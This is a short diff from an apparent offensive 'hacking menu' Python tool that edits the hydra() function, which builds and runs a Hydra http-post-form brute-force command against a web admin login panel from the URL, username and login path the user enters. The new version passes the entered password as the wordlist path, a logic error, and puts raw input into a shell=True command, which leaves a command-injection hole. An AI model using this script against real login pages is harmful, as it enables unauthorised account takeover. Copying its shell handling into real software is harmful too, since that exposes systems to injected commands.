@@ -336,19 +336,26 @@ def social_engineering():
     run("setoolkit", shell=True)
     
 def hydra():
-    time.sleep(0.5)
-    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Hydra running...")
-    time.sleep(0.5)
-    os.system('clear')
-    user_admin_name = input("Username: ")
-    user_password = input("Password: ")
-    website_url = input("Panel URL: ")
-    website_file = input("File Extension (ex. /login/admin.php/): ")
-
-    time.sleep(0.5)
-    print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
-    time.sleep(1)
-    run(f"hydra -l {user_admin_name} -P /root/Desktop/wordlist.txt {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I", shell=True)
+    try:
+        time.sleep(0.5)
+        print(Fore.BLUE + "[Status] " + Fore.WHITE + "Hydra running...")
+        time.sleep(0.5)
+        os.system('clear')
+        user_admin_name = input("Username: ")
+        user_password = input("Password: ")
+        website_url = input("Panel URL: ")
+        website_file = input("File Extension (ex. /login/admin.php/): ")
+        time.sleep(0.5)
+        print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
+        time.sleep(1)
+        command = f"hydra -l {user_admin_name} -P {user_password} {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I"
+        result = run(command, shell=True, capture_output=True, text=True)
+        print(result.stdout)
+        if result.stderr:
+            print(Fore.RED + "[Error] " + result.stderr)
+        
+    except Exception as e:
+        print(Fore.RED + f"[Error] An error occurred: {e}")
 
 def bettercap():
     time.sleep(0.5)
